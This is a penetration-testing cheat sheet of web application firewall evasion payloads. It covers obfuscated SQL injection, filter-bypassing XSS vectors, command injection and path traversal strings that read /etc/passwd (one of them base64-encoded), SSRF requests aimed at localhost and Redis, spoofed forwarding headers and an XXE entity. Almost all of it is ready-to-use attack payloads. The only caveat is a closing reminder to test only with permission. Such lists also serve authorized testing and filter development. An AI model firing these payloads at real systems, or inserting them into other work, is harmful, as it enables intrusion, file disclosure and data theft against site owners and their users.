# WAF Evasion Payloads Cheat Sheet

This document contains various Web Application Firewall (WAF) evasion techniques and payloads for penetration testing purposes.

## Table of Contents
- [Basic Evasion Techniques](#basic-evasion-techniques)
- [SQL Injection Evasion](#sql-injection-evasion)
- [XSS Evasion](#xss-evasion)
- [Command Injection Evasion](#command-injection-evasion)
- [Path Traversal Evasion](#path-traversal-evasion)
- [SSRF Evasion](#ssrf-evasion)
- [Miscellaneous Techniques](#miscellaneous-techniques)

## Basic Evasion Techniques

```http
# Case variation
SELeCT * FROM users

# Whitespace variations
SELECT/**/*/**/FROM/**/users
SELEC%09T%0D*%0CFROM%0Ausers

# Null bytes
%00SELECT * FROM users
SELECT * FROM users%00

# URL encoding
%53%45%4C%45%43%54%20%2A%20%46%52%4F%4D%20%75%73%65%72%73

# Double URL encoding
%2553%2545%254C%2545%2543%2554%2520%252A%2520%2546%2552%254F%254D%2520%2575%2573%2565%2572%2573

# HTML encoding
&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#42;&#32;&#70;&#82;&#79;&#77;&#32;&#117;&#115;&#101;&#114;&#115;

# Unicode normalization
ＳＥＬＥＣＴ ＊ ＦＲＯＭ ｕｓｅｒｓ
```

## SQL Injection Evasion

```sql
-- Comment evasion
SELECT/*avoid*/*/*WAF*/FROM users--
SELECT*FROM(users)WHERE/**/1=1--

-- Function separation
CONCAT('sel','ect') GROUP_CONCAT('us','er')

-- Alternative syntax
(SELECT * FROM users)
`users` WHERE 1=1

-- Hex encoding
0x53454C454354202A2046524F4D207573657273

-- Char() function
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(32)+CHAR(42)+CHAR(32)+CHAR(70)+CHAR(82)+CHAR(79)+CHAR(77)+CHAR(32)+CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)+CHAR(115)

-- Time-based bypass
1 AND (SELECT sleep(5) FROM users WHERE username='admin')--
```

## XSS Evasion

```html
<!-- Basic tag evasion -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<sCrIpt>alert(1)</ScRiPt>

<!-- Attribute evasion -->
<img src=x onerror=alert(1)>
<img src=x oneonerrorrror=alert(1)>

<!-- JavaScript evasion -->
<script>eval('al'+'ert(1)')</script>
<script>window['al'+'ert'](1)</script>

<!-- SVG payloads -->
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>

<!-- Unicode and encoding -->
<iframe src=javascript:%61%6C%65%72%74%28%31%29></iframe>
```

## Command Injection Evasion

```bash
# Basic bypass
cat /etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Command substitution
`cat /etc/passwd`
$(cat /etc/passwd)

# Concatenation
c"at /et"c/pa"sswd"

# Encoding
echo$IFS"Y2F0IC9ldGMvcGFzc3dk"|base64$IFS-d

# Wildcards
/bin/c?t /etc/pass??
```

## Path Traversal Evasion

```http
# Basic bypass
../../../../etc/passwd
....//....//....//etc/passwd

# URL encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoding
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Null byte
../../../../etc/passwd%00

# UNC bypass (Windows)
\\localhost\c$\windows\win.ini
```

## SSRF Evasion

```http
# Basic bypass
http://127.0.0.1
http://[::1]
http://2130706433

# URL encoding
http://%6c%6f%63%61%6c%68%6f%73%74

# DNS rebinding
http://example.com@127.0.0.1
http://127.0.0.1.example.com

# Alternative schemes
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_info
```

## Miscellaneous Techniques

```http
# HTTP Parameter Pollution
?user=test&user=admin

# HTTP Header Injection
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1

# JSON WAF bypass
{"username":"admin'--","password":"test"}
{"username":"admin'||'1'='1","password":"test"}

# XML WAF bypass
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

## Notes

1. Always test payloads in a controlled environment
2. Different WAFs may require different evasion techniques
3. Combine multiple techniques for better results
4. Some payloads may need to be URL-encoded when sent in requests
5. WAF rules are constantly updated - stay current with new evasion methods

Remember: Only use these techniques on systems you have permission to test. Unauthorized testing is illegal.
